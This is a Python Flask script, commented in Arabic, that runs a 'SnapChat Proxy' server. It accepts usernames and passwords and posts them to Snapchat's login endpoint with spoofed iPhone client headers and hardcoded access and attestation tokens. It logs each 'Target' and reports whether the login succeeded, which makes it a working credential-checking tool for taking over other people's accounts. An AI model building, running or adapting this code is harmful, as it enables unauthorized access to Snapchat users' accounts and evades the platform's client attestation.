#!/usr/bin/env python3
from flask import Flask, request, Response
import requests
import json

app = Flask(__name__)

# ============================================================
# كل التوكنات والهيدرات من جهازك النظيف
# ============================================================
HEADERS = {
    "User-Agent": "Snapchat/13.20.0.36 (iPhone15,2; iOS 17.4.1; gzip)",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Snapchat-UUID": "0196B3EE-508D-4FAC-9F7B-1B790E57DDBB",
    "X-Snap-UserID": "55a118bf-16cd-4527-9ea7-9f90fdab8faf",
    "X-Snap-Access-Token": "hCgwKCjE3Nzk2NzA4MjASgAHPo67ALSrMM9NeAahNE3jdlHSkQ-UzFQdCMXtlsYfixAZXA7omp_H7jlk",
    "x-snapchat-att-token": "Ci1iNFCsaIvuN4FmwoMSXqFN1o531mchZS20Zbt9Sv2TDy8ACaUEsYDd88NjSwoVAQAAAA==",
}

SNAPCHAT_API = "https://accounts.snapchat.com/accounts/login"

@app.route('/proxy_login', methods=['POST'])
def proxy_login():
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    print(f"\n[+] Target: {username}")
    
    # بناء طلب عادي
    login_data = {
        "username": username,
        "password": password,
        "rememberMe": "true"
    }
    
    try:
        response = requests.post(
            SNAPCHAT_API,
            headers=HEADERS,
            data=login_data,
            timeout=30,
            allow_redirects=True
        )
        
        print(f"[*] HTTP {response.status_code}")
        
        # التحقق من نجاح تسجيل الدخول
        if response.status_code == 302 or "login_success" in response.text or "snapchat.com" in response.text:
            print(f"[✓] SUCCESS for {username}!")
            return Response('{"status":"success", "message":"Login successful"}', status=200)
        else:
            print(f"[!] Failed for {username}")
            return Response('{"status":"failed", "message":"Invalid credentials"}', status=200)
            
    except Exception as e:
        print(f"[X] Error: {e}")
        return Response(f'{{"status":"error", "message": "{str(e)}"}}', status=500)

@app.route('/health', methods=['GET'])
def health():
    return Response('{"status":"running"}', status=200)

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║     SnapChat Proxy - Ready                                   ║
    ║                                                              ║
    ║  ✅ UUID: 0196B3EE-508D-4FAC-9F7B-1B790E57DDBB             ║
    ║  ✅ UserID: 55a118bf-16cd-4527-9ea7-9f90fdab8faf           ║
    ║  ✅ Attestation Token: Loaded                               ║
    ║                                                              ║
    ║  Server: http://0.0.0.0:10000/proxy_login                   ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=10000, debug=False)
